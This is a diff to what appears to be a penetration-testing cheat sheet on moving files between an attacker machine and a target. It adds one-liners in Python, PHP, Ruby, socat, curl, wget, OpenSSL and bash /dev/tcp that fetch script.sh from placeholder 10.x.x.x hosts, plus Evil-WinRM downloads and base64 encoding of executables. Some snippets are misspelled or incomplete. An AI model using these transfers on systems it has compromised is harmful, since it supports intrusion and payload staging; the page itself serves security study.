@@ -8,6 +8,8 @@ has_toc: false
 
 {% include toc.html %}
 
+<br />
+
 ## Local web server
 ```
 // Python 2
@@ -18,6 +20,15 @@ python3 -m http.server
 python3 -m http.server <port>
 python3 -m http.server --bind 172.x.x.x 443
 python3 -m http.server --bind 172.x.x.x --directory tools/ 443
+
+// Ruby
+ruby -run -ehttpd . -p8000
+
+// PHP
+php -S 0.0.0.0:8000
+
+// Socat
+socat TCP-LISTEN:8000,reuseaddr,fork
 ```
 
 See [this link](https://floatingoctothorpe.uk/2017/receiving-files-over-http-with-python.html) for creating a `http.server` that accepts `PUT` requests. Use with something like:
@@ -26,14 +37,23 @@ See [this link](https://floatingoctothorpe.uk/2017/receiving-files-over-http-wit
 curl -X PUT -T file-to-upload http://<IP>:<port>/
 ```
 
-<br />
-
 ## Local FTP server
 ```
 // Python 3
 python3 -m pyftpdlib
 python3 -m pyftpdlib --interface=172.x.x.x -p4433
 python3 -m pyftpdlib --interface=172.x.x.x -p4433 -username=user --password='pass' --directory=tools/ --verbSMB server
+```
+
+## Downloading files with Urllib
+```
+// Python 2
+import urllib
+urllib.retrieve("http://10.x.x.x/script.sh", "script.sh")
+
+// Python 3
+import urllib.request
+urllib.request.urlretieve("http://10.x.x.x/script.sh", "script.sh")
 ```
 
 <br />
@@ -52,7 +72,16 @@ impacket-smbserver -username user -password pass -port 4343 -smb2support Shared 
 
 ## PHP
 ```
+// file_get_contents
 php -r '$f = file_get_contents("http://10.x.x.x/script.sh"); file_put_contents("script.sh",$f);'
+
+// fopen
+php -r 'const BUFFER = 1024; $fremote = 
+fopen("http://10.x.x.x/script.sh", "rb"); $flocal = fopen("script.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
+
+// curl
+php -r '$rfile = "https://10.x.x.x/script.sh"; $lfile = "script.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'
+
 ```
 
 <br />
@@ -182,6 +211,57 @@ wget
 // Download remote file to local.
 *Evil-WinRM* PS C:\> Download remote.file local.file
 ```
+
+## Linux cURL and wget
+```
+// Download and save file.
+curl http://10.x.x.x/resource.sh -o resource.sh
+
+// Download and save file.
+wget http://10.x.x.x/resource.sh -O resource.sh
+```
+
+<br />
+
+## OpenSSL
+```
+// First generate a certificate.
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 1 -out cert.pem
+
+// Start server.
+openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < /file/to/serve.sh
+
+// Download.
+openssl s_client -connect 10.x.x.x:80 -quiet > served.sh
+```
+
+<br />
+
+## Bash
+```
+// Connect to webserver listening on port 80.
+exec 3<>/dev/tcp/10.x.x.x/80
+
+// Make get request.
+echo -e "GET /resource.sh HTTP/1.1\n\n">&3
+
+// Response.
+cat <&3
+```
+
+<br />
+
+## Encoding
+### OpenSSL
+```
+// Encode.
+openssl enc -base64 -in file.exe -out file.txt
+
+// Decode.
+openssl enc -base64 -d -in file.txt -out file.exe
+```
+
+<br />
 
 ## Misc
 If you have a shell and the files are small, you can convert them to `base64` and copy/paste between windows.
